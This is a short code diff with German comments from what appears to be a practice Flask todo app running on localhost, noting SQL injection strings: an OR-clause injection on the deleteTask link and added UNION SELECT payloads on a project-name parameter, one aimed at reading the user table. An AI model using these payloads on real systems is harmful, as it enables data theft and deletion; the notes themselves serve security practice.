@@ -181,8 +181,17 @@ def logout():
 ## deleteTask:
     # Sagen wir ich habe diesen Link: http://127.0.0.1:8099/deleteTask?todo_id=25
     # Ich könnte das draus machen: http://127.0.0.1:8099/deleteTask?todo_id=1 OR description IS NOT NULL; -- 
+
+
+# Union SELECT:
+## /tasks Projectname=
+    # ' UNION SELECT "888 UNION SELECT 1, 'abc', NULL, 'username'"; --%20
+    # ' UNION SELECT "888 UNION SELECT * FROM user"; --%20
     
-    
+
+
+
+
 # Zum Todos wiederherstellen:
 #INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (1, 'Build a Flask app', '2024-05-01 00:00:00', 1, 0);
 #INSERT INTO todo (id, description, due_date, project_id, is_completed) VALUES (2, 'Finalize project scope', '2024-04-15 00:00:00', 1, 0);
